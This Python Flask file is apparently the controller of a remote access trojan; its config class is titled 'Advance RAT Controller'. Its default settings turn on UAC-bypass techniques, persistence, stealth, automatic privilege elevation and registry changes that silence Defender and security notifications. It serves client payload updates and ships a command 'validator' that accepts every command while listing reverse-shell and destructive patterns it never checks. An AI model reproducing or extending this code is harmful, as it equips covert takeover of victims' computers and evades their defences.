#final controller
# Optional eventlet monkey patching controlled by env (default off)
import os
_EVENTLET_PATCH = os.environ.get('EVENTLET_MONKEY_PATCH', '0').lower() in ('1', 'true', 'yes')
if _EVENTLET_PATCH:
    try:
        import eventlet
        eventlet.monkey_patch()
        print("Eventlet monkey patch enabled via EVENTLET_MONKEY_PATCH")
    except Exception as _e:
        print(f"Failed to apply eventlet monkey patch: {_e}")

from flask import Flask
from flask_socketio import SocketIO
# rest of imports...
from flask import Flask, request, jsonify, redirect, url_for, Response, send_file, send_from_directory, session, flash, render_template_string, render_template, stream_with_context
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_caching import Cache
from prometheus_flask_exporter import PrometheusMetrics
from pythonjsonlogger import jsonlogger
import logging
import subprocess
import bleach
from markupsafe import escape
from models import SessionLocal, engine, Base, Agent as DbAgent, CommandHistory as DbCommandHistory, ActivityLog as DbActivityLog, AgentGroup as DbAgentGroup, AgentGroupMembership as DbAgentGroupMembership, AuditLog as DbAuditLog
from apscheduler.schedulers.background import BackgroundScheduler
LIMITER_AVAILABLE = False
from collections import defaultdict, deque
import datetime
import time
import os
import base64
import queue
import hashlib
import hmac
import secrets
import threading
import smtplib
from email.mime.text import MIMEText
import json
import re
import mimetypes
from typing import Optional
import io
import uuid
import pyotp
import qrcode
import requests
import json
import re
try:
    # import client as agent_client
    # agent_client = None
    pass
except Exception:
    pass
agent_client = None
AGENT_OVERRIDES = {
    'bypasses': {},
    'registry': {},
    'admin': {},
    'flags': {
        'bypasses': {},
        'registry': {},
    },
    'admin': {}
}
SUPABASE_CFG = {}

def verify_totp_code(secret: str, otp: str, window: int = 2) -> bool:
    try:
        totp = pyotp.TOTP(secret)
        now = time.time()
        if totp.verify(str(otp), valid_window=window):
            return True
        for k in range(1, window + 1):
            if totp.verify(str(otp), for_time=now + k * totp.interval):
                return True
            if totp.verify(str(otp), for_time=now - k * totp.interval):
                return True
        return False
    except Exception as _e:
        print(f"TOTP verify error: {_e}")
        return False

def get_or_create_totp_secret() -> str:
    s = load_settings()
    auth = s.get('authentication', {})
    secret = auth.get('totpSecret')
    if not secret:
        secret = pyotp.random_base32()
        issuer = auth.get('issuer') or 'Neural Control Hub'
        auth['totpSecret'] = secret
        auth['requireTwoFactor'] = True
        auth['issuer'] = issuer
        s['authentication'] = auth
        save_settings(s)
    return secret

def _derive_key(secret_key: str, salt: bytes, length: int) -> bytes:
    return hashlib.pbkdf2_hmac('sha256', secret_key.encode('utf-8'), salt, 100_000, dklen=length)

def encrypt_secret(plaintext: str, secret_key: str):
    raw = plaintext.encode('utf-8')
    salt = os.urandom(16)
    keystream = _derive_key(secret_key, salt, len(raw))
    cipher = bytes(a ^ b for a, b in zip(raw, keystream))
    return base64.urlsafe_b64encode(cipher).decode('utf-8'), base64.urlsafe_b64encode(salt).decode('utf-8')

def decrypt_secret(cipher_b64: str, salt_b64: str, secret_key: str) -> Optional[str]:
    try:
        cipher = base64.urlsafe_b64decode(cipher_b64.encode('utf-8'))
        salt = base64.urlsafe_b64decode(salt_b64.encode('utf-8'))
        keystream = _derive_key(secret_key, salt, len(cipher))
        raw = bytes(a ^ b for a, b in zip(cipher, keystream))
        return raw.decode('utf-8')
    except Exception:
        return None

def verify_totp_code(secret: str, otp: str, window: int = 2) -> bool:
    try:
        totp = pyotp.TOTP(secret)
        now = time.time()
        if totp.verify(str(otp), valid_window=window):
            return True
        for k in range(1, window + 1):
            if totp.verify(str(otp), for_time=now + k * totp.interval):
                return True
            if totp.verify(str(otp), for_time=now - k * totp.interval):
                return True
        return False
    except Exception as _e:
        print(f"TOTP verify error: {_e}")
        return False

# WebRTC imports for SFU functionality
try:
    import asyncio
    import aiortc
    from aiortc import RTCPeerConnection, RTCSessionDescription, MediaStreamTrack, RTCConfiguration, RTCIceServer, RTCIceCandidate
    from aiortc.contrib.media import MediaPlayer, MediaRecorder
    from aiortc.mediastreams import MediaStreamError
    WEBRTC_AVAILABLE = True
    print("WebRTC (aiortc) support enabled")
except ImportError:
    WEBRTC_AVAILABLE = False
    print("WebRTC (aiortc) not available - falling back to Socket.IO streaming")

WEBRTC_CONFIG = {
    'enabled': WEBRTC_AVAILABLE,
    'ice_servers': [
        {'urls': 'stun:stun.l.google.com:19302'},
        {'urls': 'stun:stun1.l.google.com:19302'},
        {'urls': 'stun:stun2.l.google.com:19302'},
        {'urls': 'stun:stun3.l.google.com:19302'},
        {'urls': 'stun:stun4.l.google.com:19302'}
    ],
    'codecs': {
        'video': ['H.264', 'VP9', 'VP8'],
        'audio': ['Opus', 'PCM']
    },
    'simulcast': True,
    'svc': True,
    'bandwidth_estimation': True,
    'adaptive_bitrate': True,
    'frame_dropping': True,
    'quality_levels': {
        'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000},
        'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000},
        'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000},
        'auto': {'adaptive': True, 'min_bitrate': 500000, 'max_bitrate': 10000000}
    },
    'performance_tuning': {
        'keyframe_interval': 2,
        'disable_b_frames': True,
        'ultra_low_latency': True,
        'hardware_acceleration': True,
        'gop_size': 60,
        'max_bitrate_variance': 0.3
    },
    'monitoring': {
        'connection_quality_metrics': True,
        'automatic_reconnection': True,
        'detailed_logging': True,
        'stats_interval': 1000,
        'quality_thresholds': {
            'min_bitrate': 100000,
            'max_latency': 1000,
            'min_fps': 15
        }
    }
}

# Supabase Vault integration (optional)
SUPABASE_URL = os.environ.get('SUPABASE_URL')
SUPABASE_SERVICE_ROLE_KEY = os.environ.get('SUPABASE_SERVICE_ROLE_KEY')
ADMIN_USER_ID = os.environ.get('ADMIN_USER_ID', '00000000-0000-0000-0000-000000000001')

def supabase_rpc(fn: str, payload: dict):
    if not SUPABASE_URL or not SUPABASE_SERVICE_ROLE_KEY:
        return None
    try:
        url = SUPABASE_URL.rstrip('/') + f"/rest/v1/rpc/{fn}"
        headers = {
            'apikey': SUPABASE_SERVICE_ROLE_KEY,
            'Authorization': f'Bearer {SUPABASE_SERVICE_ROLE_KEY}',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        if 200 <= resp.status_code < 300:
            try:
                return resp.json()
            except Exception:
                return resp.text
        # Silence expected 404/401 when RPC not provisioned or unauthorized
        if resp.status_code in (401, 403, 404):
            return None
        if os.environ.get('SUPABASE_VERBOSE') == '1':
            print(f"Supabase RPC error {resp.status_code}: {resp.text}")
        return None
    except Exception as e:
        if os.environ.get('SUPABASE_VERBOSE') == '1':
            print(f"Supabase RPC exception: {e}")
        return None

def supabase_rpc_user(fn: str, payload: dict, user_jwt: str | None):
    if not SUPABASE_URL:
        return None
    try:
        url = SUPABASE_URL.rstrip('/') + f"/rest/v1/rpc/{fn}"
        headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        if user_jwt:
            headers['Authorization'] = f'Bearer {user_jwt}'
            headers['apikey'] = SUPABASE_SERVICE_ROLE_KEY or ''
        elif SUPABASE_SERVICE_ROLE_KEY:
            headers['Authorization'] = f'Bearer {SUPABASE_SERVICE_ROLE_KEY}'
            headers['apikey'] = SUPABASE_SERVICE_ROLE_KEY
        else:
            return None
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        if 200 <= resp.status_code < 300:
            try:
                return resp.json()
            except Exception:
                return resp.text
        # Silence expected 404/401 when RPC not provisioned or unauthorized
        if resp.status_code in (401, 403, 404):
            return None
        if os.environ.get('SUPABASE_VERBOSE') == '1':
            print(f"Supabase RPC (user) error {resp.status_code}: {resp.text}")
        return None
    except Exception as e:
        if os.environ.get('SUPABASE_VERBOSE') == '1':
            print(f"Supabase RPC (user) exception: {e}")
        return None

# Configuration Management
class Config:
    """Configuration class for Advance RAT Controller"""
    
    # Admin Authentication
    ADMIN_PASSWORD = (
        os.environ.get('ADMIN_PASSWORD')
        or os.environ.get('Admin_Password')
        or os.environ.get('admin_password')
    )
    
    # Validate password strength
    if ADMIN_PASSWORD:
        if len(ADMIN_PASSWORD) < 8:
            raise ValueError("ADMIN_PASSWORD must be at least 8 characters long.")
        if not any(c.isupper() for c in ADMIN_PASSWORD):
            print("Warning: ADMIN_PASSWORD should contain uppercase letters for better security.")
        if not any(c.isdigit() for c in ADMIN_PASSWORD):
            print("Warning: ADMIN_PASSWORD should contain digits for better security.")
    
    # Flask Configuration
    SECRET_KEY = os.environ.get('SECRET_KEY', None)
    
    # Server Configuration
    HOST = os.environ.get('HOST', '0.0.0.0')
    PORT = int(os.environ.get('PORT', 8080))
    
    # Security Settings
    SESSION_TIMEOUT = int(os.environ.get('SESSION_TIMEOUT', 3600))  # 1 hour in seconds
    MAX_LOGIN_ATTEMPTS = int(os.environ.get('MAX_LOGIN_ATTEMPTS', 5))
    LOGIN_TIMEOUT = int(os.environ.get('LOGIN_TIMEOUT', 300))  # 5 minutes lockout
    
    # Password Security Settings
    SALT_LENGTH = 32  # Length of salt in bytes
    HASH_ITERATIONS = 100000  # Number of iterations for PBKDF2

# Initialize Flask app with configuration
app = Flask(__name__)
app.config['SECRET_KEY'] = Config.SECRET_KEY or secrets.token_hex(32)  # Use config or generate secure random key
try:
    _max_mb = int(os.environ.get('FILE_UPLOAD_MAX_MB', '1024'))
except Exception:
    _max_mb = 1024
app.config['MAX_CONTENT_LENGTH'] = _max_mb * 1024 * 1024
try:
    _ext = os.environ.get("RENDER_EXTERNAL_URL", "")
    _is_prod = bool(_ext)
    app.config['SESSION_COOKIE_SAMESITE'] = 'None' if _is_prod else 'Lax'
    app.config['SESSION_COOKIE_SECURE'] = True if _is_prod else False
    app.config['SESSION_COOKIE_HTTPONLY'] = True
    from werkzeug.middleware.proxy_fix import ProxyFix
    app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_port=1)
except Exception:
    pass

logHandler = logging.StreamHandler()
formatter = jsonlogger.JsonFormatter('%(asctime)s %(levelname)s %(name)s %(message)s')
logHandler.setFormatter(formatter)
logger = logging.getLogger()
logger.handlers = []
logger.addHandler(logHandler)
logger.setLevel(logging.INFO)

REDIS_URL = os.environ.get("REDIS_URL", "")
limiter = Limiter(app=app, key_func=get_remote_address, storage_uri=REDIS_URL if REDIS_URL else "memory://", default_limits=[])
cache = Cache(app, config={'CACHE_TYPE': 'redis' if REDIS_URL else 'simple', 'CACHE_REDIS_URL': REDIS_URL})
metrics = PrometheusMetrics(app)
Base.metadata.create_all(bind=engine)

# Staged uploads for PowerShell curl mechanism
STAGED_UPLOADS = {}
def _stage_register(upload_id, path, filename):
    STAGED_UPLOADS[upload_id] = {'path': path, 'filename': filename, 'ts': time.time()}
def _stage_get(upload_id):
    return STAGED_UPLOADS.get(upload_id)
def _stage_cleanup(upload_id):
    try:
        info = STAGED_UPLOADS.pop(upload_id, None)
        if info and os.path.exists(info['path']):
            os.remove(info['path'])
    except Exception:
        pass

def get_db():
    return SessionLocal()

def sanitize_input(data: str, allow_html: bool = False) -> str:
    if not isinstance(data, str):
        return ''
    if not allow_html:
        return str(escape(data))
    allowed_tags = ['b', 'i', 'u', 'em', 'strong', 'a', 'code', 'pre']
    allowed_attrs = {'a': ['href', 'title']}
    return bleach.clean(data, tags=allowed_tags, attributes=allowed_attrs, strip=True)

# Add security headers
@app.after_request
def add_security_headers(response):
    """Add security headers to all responses"""
    response.headers['X-Content-Type-Options'] = 'nosniff'
    if request.path.startswith('/api/agents/') and ('/files/stream' in request.path or '/files/thumbnail' in request.path):
        response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    else:
        response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' 'unsafe-eval' blob: data:; "
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
        "font-src 'self' data: https://fonts.gstatic.com; "
        "img-src 'self' data: https: blob:; "
        "connect-src 'self' http: https: ws: wss:;"
    )
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
    return response

# Defer CORS/socket initialization until after settings helpers are defined
socketio = None

# Optional rate limiting (disabled in this revision)

# -----------------------------
# Settings persistence (JSON)
# -----------------------------
SETTINGS_FILE_PATH = os.environ.get('SETTINGS_FILE_PATH', os.path.join(os.path.dirname(__file__), 'settings.json'))

DEFAULT_SETTINGS = {
    'server': {
        'controllerUrl': f"http://{Config.HOST}:{Config.PORT}",
        'serverPort': Config.PORT,
        'sslEnabled': False,
        'maxAgents': 100,
        'heartbeatInterval': 30,
        'commandTimeout': 30,
        'autoReconnect': True,
        'backupUrl': ''
    },
    'authentication': {
        # Do NOT persist plaintext in production; kept here for parity with UI. Prefer env ADMIN_PASSWORD.
        'operatorPassword': '',
        'sessionTimeout': 30,
        'maxLoginAttempts': 3,
        'requireTwoFactor': False,
        'apiKeyEnabled': True,
        'apiKey': '',
        'trustedDevices': []
        ,
        'totpEnrolled': False
    },
    'email': {
        'enabled': False,
        'smtpServer': 'smtp.gmail.com',
        'smtpPort': 587,
        'username': '',
        'password': '',
        'recipient': '',
        'enableTLS': True,
        'notifyAgentOnline': True,
        'notifyAgentOffline': True,
        'notifyCommandFailure': True,
        'notifySecurityAlert': True
    },
    'agent': {
        'defaultPersistence': True,
        'enableUACBypass': True,
        'enableDefenderDisable': False,
        'enableAdvancedPersistence': True,
        'silentMode': True,
        'quickStartup': False,
        'enableStealth': True,
        'autoElevatePrivileges': True,
        'requestAdminFirst': False,
        'maxPromptAttempts': 3,
        'uacBypassDebug': True,
        'persistentAdminPrompt': False
    },
    'bypasses': {
        'enabled': True,
        'methods': {
            'cleanmgr_sagerun': True,
            'fodhelper': True,
            'computerdefaults': True,
            'eventvwr': True,
            'sdclt': True,
            'wsreset': True,
            'slui': True,
            'winsat': True,
            'silentcleanup': True,
            'icmluautil': True
        }
    },
    'registry': {
        'enabled': True,
        'notificationsEnabled': True,
        'actions': {
            'policy_push_notifications': True,
            'policy_windows_update': True,
            'context_runas_cmd': True,
            'context_powershell_admin': True,
            'notify_center_hkcu': True,
            'notify_center_hklm': True,
            'defender_ux_suppress': True,
            'toast_global_above_lock': True,
            'toast_global_critical_above_lock': True,
            'toast_windows_update': True,
            'toast_security_maintenance': True,
            'toast_windows_security': True,
            'toast_sec_health_ui': True,
            'explorer_balloon_tips': True,
            'explorer_info_tip': True
        }
    },
    'webrtc': {
        'enabled': True,
        'iceServers': [
            'stun:stun.l.google.com:19302',
            'stun:stun1.l.google.com:19302',
            {
                'urls': 'turn:turn.example.com:3478',
                'username': '',
                'credential': ''
            }
        ],
        'maxBitrate': 5000000,
        'adaptiveBitrate': True,
        'frameDropping': True,
        'qualityLevel': 'auto',
        'monitoringEnabled': True
    },
    'security': {
        'encryptCommunication': True,
        'validateCertificates': False,
        'allowSelfSigned': True,
        'rateLimitEnabled': True,
        'rateLimitRequests': 100,
        'rateLimitWindow': 60,
        # Allow configuring additional CORS origins from UI
        'frontendOrigins': [],
        'blocked_ips': []
    }
}

def _deep_update(original: dict, updates: dict) -> dict:
    for key, value in updates.items():
        if isinstance(value, dict) and isinstance(original.get(key), dict):
            _deep_update(original[key], value)
        else:
            original[key] = value
    return original

def load_settings() -> dict:
    try:
        if os.path.exists(SETTINGS_FILE_PATH):
            with open(SETTINGS_FILE_PATH, 'r') as f:
                data = json.load(f)
            # Merge with defaults to ensure missing keys are present
            merged = json.loads(json.dumps(DEFAULT_SETTINGS))
            return _deep_update(merged, data)
    except Exception as e:
        print(f"Failed to load settings.json: {e}")
    return json.loads(json.dumps(DEFAULT_SETTINGS))

def save_settings(data: dict) -> bool:
    try:
        with open(SETTINGS_FILE_PATH, 'w') as f:
            json.dump(data, f, indent=2)
        return True
    except Exception as e:
        print(f"Failed to save settings.json: {e}")
        return False

# Updater storage
UPDATER_DIR = os.path.join(os.path.dirname(__file__), 'updates')
UPDATER_STATE_PATH = os.path.join(UPDATER_DIR, 'updater_state.json')
UPDATER_CLIENT_PATH = os.path.join(UPDATER_DIR, 'client_latest.py')

# Chrome Extension config
EXTENSION_CONFIG_PATH = os.path.join(os.path.dirname(__file__), 'extension_config.json')

def _ensure_updater_dir():
    try:
        os.makedirs(UPDATER_DIR, exist_ok=True)
    except Exception:
        pass

def _compute_sha256(path: str) -> str:
    try:
        h = hashlib.sha256()
        with open(path, 'rb') as f:
            for chunk in iter(lambda: f.read(8192), b''):
                h.update(chunk)
        return h.hexdigest()
    except Exception:
        return ''

def _read_updater_state() -> dict:
    _ensure_updater_dir()
    state = {}
    try:
        if os.path.exists(UPDATER_STATE_PATH):
            with open(UPDATER_STATE_PATH, 'r', encoding='utf-8', errors='ignore') as f:
                state = json.load(f)
    except Exception:
        state = {}
    # Ensure version field exists
    if 'version' not in state or not state.get('version'):
        try:
            state['version'] = str(int(time.time()))
        except Exception:
            state['version'] = ''
    if 'download_url' not in state or not state.get('download_url'):
        try:
            # Prefer alias route that serves client_latest.py as client.py
            state['download_url'] = url_for('download_updater_client_alias', _external=True)
        except Exception:
            try:
                base = request.url_root.rstrip('/')
            except Exception:
                base = f"http://{Config.HOST}:{Config.PORT}"
            state['download_url'] = base + "/download/updater/client.py"
    # Normalize download_url to versioned file client_V<version>.py if possible
    try:
        ver = str(state.get('version') or '').strip()
        if ver:
            versioned_name = f"client_V{ver}.py"
            versioned_path = os.path.join(UPDATER_DIR, versioned_name)
            if not os.path.isfile(versioned_path) and os.path.isfile(UPDATER_CLIENT_PATH):
                import shutil as _shutil
                try:
                    _shutil.copyfile(UPDATER_CLIENT_PATH, versioned_path)
                except Exception:
                    pass
            if os.path.isfile(versioned_path):
                try:
                    state['download_url'] = url_for('download_updater_file', filename=versioned_name, _external=True)
                except Exception:
                    try:
                        base = request.url_root.rstrip('/')
                    except Exception:
                        base = f"http://{Config.HOST}:{Config.PORT}"
                    state['download_url'] = base + f"/download/updater/{versioned_name}"
                # Persist normalized state to disk
                try:
                    with open(UPDATER_STATE_PATH, 'w', encoding='utf-8', errors='ignore') as f:
                        json.dump(state, f, indent=2)
                except Exception:
                    pass
    except Exception:
        pass
    if ('sha256' not in state or not state.get('sha256')) and os.path.exists(UPDATER_CLIENT_PATH):
        state['sha256'] = _compute_sha256(UPDATER_CLIENT_PATH)
    return state

def _read_extension_config() -> dict:
    cfg = {'download_url': '', 'extension_id': os.environ.get('VAULT_EXTENSION_ID') or 'cicnkiabgagcfkheiplebojnbjpldlff', 'display_name': ''}
    try:
        if os.path.exists(EXTENSION_CONFIG_PATH):
            with open(EXTENSION_CONFIG_PATH, 'r', encoding='utf-8', errors='ignore') as f:
                on_disk = json.load(f)
                if isinstance(on_disk, dict):
                    cfg.update({k: v for k, v in on_disk.items() if k in ('download_url', 'extension_id', 'display_name')})
    except Exception:
        pass
    if not cfg.get('extension_id'):
        cfg['extension_id'] = os.environ.get('VAULT_EXTENSION_ID') or 'cicnkiabgagcfkheiplebojnbjpldlff'
    # Auto-derive extension_id from local CRX if present and id looks like default
    try:
        default_id = os.environ.get('VAULT_EXTENSION_ID') or 'cicnkiabgagcfkheiplebojnbjpldlff'
        looks_default = (cfg.get('extension_id') or '').strip() == default_id
        crx_path = os.path.join(os.getcwd(), 'chrome-extension', 'extension.crx')
        if looks_default and os.path.isfile(crx_path):
            with open(crx_path, 'rb') as cf:
                head = cf.read(1024 * 1024)
            derived = _ext_id_from_crx_header(head) or ''
            if derived:
                cfg['extension_id'] = derived
                try:
                    _save_extension_config(cfg)
                except Exception:
                    pass
    except Exception:
        pass
    return cfg

def _save_extension_config(cfg: dict) -> bool:
    try:
        keep = {k: v for k, v in (cfg or {}).items() if k in ('download_url', 'extension_id', 'display_name')}
        with open(EXTENSION_CONFIG_PATH, 'w', encoding='utf-8', errors='ignore') as f:
            json.dump(keep, f, indent=2)
        return True
    except Exception:
        return False
def _decode_ext_id(b: bytes) -> str:
    try:
        t = "abcdefghijklmnop"
        return "".join(t[(x >> 4) & 15] + t[x & 15] for x in b)
    except Exception:
        return ""
def _find_der_public_key(buf: bytes) -> bytes:
    try:
        from cryptography.hazmat.primitives import serialization as _ser
        n = len(buf)
        i = 0
        while i + 4 <= n:
            if buf[i] == 0x30 and buf[i + 1] == 0x82:
                length = int.from_bytes(buf[i + 2:i + 4], "big")
                end = i + 4 + length
                if end <= n:
                    cand = buf[i:end]
                    try:
                        _ser.load_der_public_key(cand)
                        return cand
                    except Exception:
                        pass
            i += 1
    except Exception:
        return b""
    return b""
def _ext_id_from_crx_header(data: bytes) -> str:
    try:
        if not data or len(data) < 12:
            return ""
        if data[:4] != b"Cr24":
            return ""
        ver = int.from_bytes(data[4:8], "little")
        if ver == 2:
            if len(data) < 16:
                return ""
            pub_len = int.from_bytes(data[8:12], "little")
            sig_len = int.from_bytes(data[12:16], "little")
            if len(data) < 16 + pub_len:
                return ""
            pub = data[16:16 + pub_len]
            der = b""
            try:
                from cryptography.hazmat.primitives import serialization as _ser
                try:
                    _ser.load_der_public_key(pub)
                    der = pub
                except Exception:
                    der = _find_der_public_key(pub)
            except Exception:
                der = _find_der_public_key(pub)
            import hashlib as _hashlib
            src = der or pub
            d = _hashlib.sha256(src).digest()[:16]
            return _decode_ext_id(d)
        else:
            header_size = int.from_bytes(data[8:12], "little")
            if len(data) < 12 + header_size:
                return ""
            hdr = data[12:12 + header_size]
            i = hdr.find(b"\x12\x10")
            if i >= 0 and i + 18 <= len(hdr):
                cid = hdr[i + 2:i + 18]
                if len(cid) == 16:
                    return _decode_ext_id(cid)
            der = _find_der_public_key(hdr)
            if not der:
                der = _find_der_public_key(data)
            if der:
                import hashlib as _hashlib
                d = _hashlib.sha256(der).digest()[:16]
                return _decode_ext_id(d)
            return ""
    except Exception:
        return ""
def _derive_extension_id_from_crx_url(download_url: str) -> str:
    try:
        if not download_url:
            return ""
        import urllib.request as _urlreq
        req = _urlreq.Request(download_url, headers={"User-Agent": "Mozilla/5.0"})
        with _urlreq.urlopen(req, timeout=10) as resp:
            buf = resp.read(1024 * 1024)
        return _ext_id_from_crx_header(buf) or ""
    except Exception:
        return ""

# Now that settings helpers exist, configure CORS and Socket.IO
allowed_origins = [
    "http://localhost:3000",
    "http://localhost:5173",
    "http://127.0.0.1:3000",
    "http://127.0.0.1:5173",
    "http://localhost:8080",
    "http://127.0.0.1:8080",
    "https://neural-control-hub-frontend.onrender.com",
    "https://agent-controller-backend.onrender.com",
    "https://neural-control-hub.onrender.com",
]

try:
    _loaded = load_settings()
    for origin in _loaded.get('security', {}).get('frontendOrigins', []) or []:
        if isinstance(origin, str) and origin not in allowed_origins:
            allowed_origins.append(origin)
    _webrtc = _loaded.get('webrtc', {})
    if _webrtc.get('iceServers') is not None:
        servers = []
        for s in _webrtc['iceServers']:
            if isinstance(s, str):
                servers.append({'urls': s})
            elif isinstance(s, dict):
                if 'urls' in s:
                    merged = {'urls': s['urls']}
                    for k, v in s.items():
                        if k != 'urls':
                            merged[k] = v
                    servers.append(merged)
                else:
                    servers.append(s)
        WEBRTC_CONFIG['ice_servers'] = servers
    if 'enabled' in _webrtc:
        WEBRTC_CONFIG['enabled'] = bool(_webrtc['enabled'])
except Exception as _e:
    print(f"Warning loading dynamic CORS origins: {_e}")

# Add safe wildcard support for Render subdomains using regex (Flask-CORS supports regex)
render_wildcard_regex = r'^https://.*\.onrender\.com$'

CORS(
    app,
    origins=allowed_origins + [render_wildcard_regex],
    supports_credentials=True,
    allow_headers=["Content-Type", "Authorization", "X-Requested-With"]
)

# Initialize Socket.IO with expanded origin allowlist (include render.com wildcard)
render_origins = [
    "https://agent-controller-backend.onrender.com",
    "https://neural-control-hub-frontend.onrender.com",
    "https://neural-control-hub.onrender.com",
]
# Add any render.com subdomain variations
for subdomain in ["www", "app", "dashboard", "frontend", "backend"]:
    render_origins.append(f"https://{subdomain}.onrender.com")
    render_origins.append(f"https://agent-controller-{subdomain}.onrender.com")
    render_origins.append(f"https://neural-control-hub-{subdomain}.onrender.com")
# Add the Render-provided external URL if present
try:
    _ext = os.environ.get("RENDER_EXTERNAL_URL")
    if _ext and _ext not in allowed_origins:
        allowed_origins.append(_ext)
    if _ext and _ext not in render_origins:
        render_origins.append(_ext)
except Exception:
    pass

def _sanitize_origin_list(items):
    cleaned = []
    seen = set()
    for it in (items or []):
        s = str(it or '').strip().strip('`').strip('"').strip("'")
        if not s:
            continue
        if s in seen:
            continue
        seen.add(s)
        cleaned.append(s)
    return cleaned
all_socketio_origins = _sanitize_origin_list(allowed_origins + render_origins)
env_async = os.environ.get('SOCKET_ASYNC_MODE', '').strip().lower()
if env_async in ('threading', 'eventlet', 'gevent', 'gevent_uwsgi', 'asgi'):
    ASYNC_MODE = env_async
else:
    try:
        import eventlet  # noqa: F401
        ASYNC_MODE = 'eventlet'
    except Exception:
        ASYNC_MODE = 'threading'
ALLOW_UPGRADES = ASYNC_MODE not in ('threading', 'asgi')
socketio = SocketIO(
    app,
    async_mode=ASYNC_MODE,
    cors_allowed_origins=all_socketio_origins,
    allow_upgrades=ALLOW_UPGRADES,
    max_http_buffer_size=50 * 1024 * 1024,
    ping_interval=25,
    ping_timeout=60,
    logger=False,
    engineio_logger=False
)
print(f"Socket.IO CORS origins: {all_socketio_origins}")

def require_socket_auth(f):
    from functools import wraps
    @wraps(f)
    def decorated(*args, **kwargs):
        try:
            if not is_authenticated():
                emit('error', {'message': 'Authentication required'})
                return
        except Exception:
            emit('error', {'message': 'Authentication required'})
            return
        return f(*args, **kwargs)
    return decorated

ALLOWED_COMMANDS = {
    'windows': ['systeminfo', 'tasklist', 'netstat', 'ipconfig', 'whoami'],
    'linux': ['ps', 'netstat', 'ifconfig', 'whoami', 'uname'],
    'common': ['pwd', 'cd', 'ls', 'dir']
}

DANGEROUS_PATTERNS = [
    r'rm\s+-rf\s*/',
    r'del\s+/[sS]\s+/[qQ]',
    r'format\s+',
    r'shutdown',
    r'reboot',
    r'halt',
    r'poweroff',
    r'mkfs',
    r'dd\s+if=',
    r':\(\)\{.*\};:',
    r'wget.*\|.*sh',
    r'curl.*\|.*bash',
    r'nc\s+-l',
    r'bash\s+-i',
    r'exec\s+',
]

def validate_command(command: str, platform: str = 'windows'):
    return True, "Command validated"

AGENT_TOKENS = {}
AGENT_AUTH_REQUIRED = os.environ.get("AGENT_AUTH_REQUIRED", "false").lower() in ("1", "true", "yes")

def generate_agent_token(agent_id: str) -> str:
    token = secrets.token_urlsafe(32)
    AGENT_TOKENS[agent_id] = hashlib.sha256(token.encode()).hexdigest()
    return token

def verify_agent_token(agent_id: str, token: str) -> bool:
    if agent_id not in AGENT_TOKENS:
        return False
    token_hash = hashlib.sha256((token or "").encode()).hexdigest()
    return hmac.compare_digest(AGENT_TOKENS[agent_id], token_hash)

class E2EEncryption:
    def __init__(self, agent_id: str, shared_secret: str):
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        from cryptography.fernet import Fernet
        import base64 as _b64
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=agent_id.encode(), iterations=100000)
        key = _b64.urlsafe_b64encode(kdf.derive(shared_secret.encode()))
        self.cipher = Fernet(key)
    def encrypt(self, data: str) -> str:
        return self.cipher.encrypt((data or "").encode()).decode()
    def decrypt(self, encrypted: str) -> str:
        return self.cipher.decrypt((encrypted or "").encode()).decode()

class AdaptiveStreamingManager:
    def __init__(self):
        self.quality_levels = {
            'low': {'resolution': (640, 480), 'fps': 15, 'quality': 50},
            'medium': {'resolution': (1280, 720), 'fps': 24, 'quality': 70},
            'high': {'resolution': (1920, 1080), 'fps': 30, 'quality': 85}
        }
        from collections import defaultdict as _dd
        self.agent_quality = _dd(lambda: 'medium')
    def adjust_quality(self, agent_id: str, latency_ms: float, packet_loss: float):
        if latency_ms > 500 or packet_loss > 0.05:
            self.agent_quality[agent_id] = 'low'
        elif latency_ms < 100 and packet_loss < 0.01:
            self.agent_quality[agent_id] = 'high'
        else:
            self.agent_quality[agent_id] = 'medium'

class AuditLogger:
    def __init__(self):
        pass
    def log_action(self, user_id: str, action: str, agent_id: str = None, details: dict = None, severity: str = 'INFO'):
        try:
            db = get_db()
            entry = DbAuditLog(
                user_id=user_id,
                action=action,
                agent_id=agent_id,
                details=json.dumps(details or {}),
                severity=severity,
                ip_address=get_client_ip()
            )
            db.add(entry)
            db.commit()
            db.close()
        except Exception:
            pass

audit = AuditLogger()

def send_email_notification(subject: str, body: str) -> bool:
    try:
        cfg = load_settings().get('email', {})
        if not cfg.get('enabled'):
            return False
        smtp_server = cfg.get('smtpServer')
        smtp_port = int(cfg.get('smtpPort') or 587)
        username = cfg.get('username')
        password = cfg.get('password')
        recipient = cfg.get('recipient')
        if not all([smtp_server, smtp_port, username, password, recipient]):
            print("Email settings incomplete; skipping notification")
            return False
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = username
        msg['To'] = recipient
        server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
        if cfg.get('enableTLS', True):
            server.starttls()
        server.login(username, password)
        server.sendmail(username, [recipient], msg.as_string())
        server.quit()
        return True
    except smtplib.SMTPAuthenticationError as e:
        print(f"SMTP authentication failed: {e}")
        return False
    except smtplib.SMTPConnectError as e:
        print(f"SMTP connection failed: {e}")
        return False
    except smtplib.SMTPException as e:
        print(f"SMTP error: {e}")
        return False
    except Exception as e:
        print(f"Unexpected email notification error: {e}")
        return False

 

